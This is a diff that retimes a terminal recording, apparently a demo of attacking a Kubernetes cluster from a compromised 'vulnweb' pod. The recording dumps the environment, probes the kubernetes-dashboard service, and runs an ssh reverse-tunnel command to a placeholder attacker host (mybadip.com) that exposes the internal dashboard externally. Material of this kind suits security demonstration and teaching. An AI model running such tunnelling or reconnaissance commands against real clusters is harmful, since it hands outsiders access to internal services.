@@ -15,7 +15,7 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      0.4,
+      0.2,
       "e"
     ],
     [
@@ -27,11 +27,11 @@
       "v"
     ],
     [
-      2.0,
+      0.3,
       "\r\nVULNWEB_SERVICE_HOST=100.64.100.28\r\nVULNWEB_PORT_8000_TCP_ADDR=100.64.100.28\r\nHOSTNAME=vulnweb-2569941405-q8v9r\r\nGPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF\r\nVULNWEB_PORT_8000_TCP=tcp://100.64.100.28:8000\r\nTERM=xterm\r\nKUBERNETES_PORT_443_TCP_PORT=443\r\nKUBERNETES_PORT=tcp://100.64.0.1:443\r\nVULNWEB_PORT_8000_TCP_PROTO=tcp\r\nVULNWEB_PORT=tcp://100.64.100.28:8000\r\nKUBERNETES_SERVICE_PORT=443\r\nKUBERNETES_SERVICE_HOST=100.64.0.1\r\nPYTHON_VERSION=2.7.13\r\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nVULNWEB_PORT_8000_TCP_PORT=8000\r\nPWD=/\r\nLANG=C.UTF-8\r\nVULNWEB_SERVICE_PORT=8000\r\nPYTHON_PIP_VERSION=9.0.1\r\nSHLVL=1\r\nHOME=/root\r\nKUBERNETES_PORT_443_TCP_PROTO=tcp\r\nKUBERNETES_SERVICE_PORT_HTTPS=443\r\nKUBERNETES_PORT_443_TCP_ADDR=100.64.0.1\r\nKUBERNETES_PORT_443_TCP=tcp://100.64.0.1:443\r\n_=/usr/bin/env\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      0.757009,
+      0.557009,
       "curl -sk http://kubernetes-dashboard.kube-system"
     ],
     [
@@ -47,7 +47,7 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.8,
       "c"
     ],
     [
@@ -75,23 +75,23 @@
       "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      0.407833,
+      0.307833,
       "ping kubernetes-dashboard.kube-system"
     ],
     [
-      0.492484,
+      0.892484,
       "\r\nPING kubernetes-dashboard.kube-system.svc.cluster.local (100.66.61.239) 56(84) bytes of data.\r\n"
     ],
     [
-      1.102296,
+      0.802296,
       "^C\r\n--- kubernetes-dashboard.kube-system.svc.cluster.local ping statistics ---\r\n2 packets transmitted, 0 received, 100% packet loss, time 1007ms\r\n\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      3.0,
+      1.0,
       "ssh -R8000:100.66.61.239:80 baduser@mybadip.com"
     ],
     [
-      3.0,
+      0.4,
       "\r\n"
     ],
     [
